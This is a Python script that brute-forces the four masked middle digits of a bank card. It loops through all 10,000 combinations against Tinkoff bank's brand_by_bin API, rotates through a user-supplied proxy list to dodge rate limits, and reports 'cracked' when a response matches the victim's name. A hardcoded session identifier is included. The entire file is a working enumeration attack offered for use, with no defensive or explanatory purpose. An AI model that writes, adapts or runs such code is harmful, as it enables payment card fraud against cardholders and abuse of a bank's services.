import requests
from time import sleep
from re import search
from os import system
from threading import Thread

first_card_digits = input('first_card_digits: ')
last_card_digits = input('last_card_digits: ')
name = input('name: ')
proxy = input('proxy: ')
threads = int(input('threads: '))


with open(proxy,'rt') as file:
    proxy_list = file.read().split('\n')


count_threads = 0
count_1 = 0;count_2 = 0;count_3 = 0;count_4 = 0
iter_proxy = 0
count_req = 0


def request(card,proxies):
    params = {'bin':card,'origin':'web%2Cib5%2Cplatform','sessionid':'0378Fz4TBseR5WAg0WQS63qGDAz9PUHK.m1-prod-api35','wuid':'ef92edb59b684e6e8f1d5b6e6d714cb5'}
    resp = requests.get('https://api.tinkoff.ru//v1/brand_by_bin',params=params,proxies=proxies)
    result = search(name,resp.text)
    if result != None:
        system('clear')
        print('##################################################')
        print('status: cracked')
        print('card: ' + card)
        print('##################################################')
        quit()
    else:
        print(resp.text)

while True:
    if threads == count_threads:
        sleep(10)
        count_threads = 0
    
    if count_req == 9:
        iter_proxy += 1
        count_req = 0
    if iter_proxy == len(proxy_list):
        sleep(60)
        iter_proxy = 0
    elif proxy_list[iter_proxy] == "":
        sleep(60)
        iter_proxy = 0

    

    proxies = {'https':'https://' + proxy_list[iter_proxy]}
    if count_1 > 9:
        count_1 = 0
        count_2 += 1
    if count_2 > 9:
        count_2 = 0
        count_3 += 1
    if count_3 > 9:
        count_3 = 0
        count_4 += 1
    if count_4 > 9:
        print('not found')
        quit()

    count = str(count_4) + str(count_3) + str(count_2) + str(count_1)
    count_1 += 1
    count_req += 1 
    count_threads += 1
    card = first_card_digits + count + last_card_digits
    print('checked: ' + card)    
    request(card,proxies)
    #thr = Thread(target=request, args=(card,proxies,))
    #thr.start()



